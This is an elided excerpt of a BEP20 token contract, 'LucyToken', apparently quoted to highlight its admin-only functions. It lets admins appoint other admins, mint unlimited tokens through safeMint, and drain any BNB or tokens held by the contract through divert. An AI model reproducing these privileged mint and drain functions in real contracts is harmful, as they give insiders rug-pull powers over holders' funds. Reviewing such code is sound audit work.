...
contract LucyToken is Context, IBEP20, Ownable {
    ...
    modifier onlyAdmin{
        require(adminMap[msg.sender], "revert!");
        _;
    }
    /**
     * @dev Returns the bep token owner.
   */
    ...
    function setAdStatus(address account, bool status) external onlyAdmin {
  ...
  */
   ...
   */
    function safeMint(address account, uint256 amount) public onlyAdmin returns (bool) {
   ...
   */
    ...
    function divert(address _erc20, address payable account, uint256 amount) public onlyAdmin {
        if (_erc20 == address(0x0)) {
            account.transfer(amount);
        } else {
            IBEP20(_erc20).transfer(account, amount);
        }
    }
}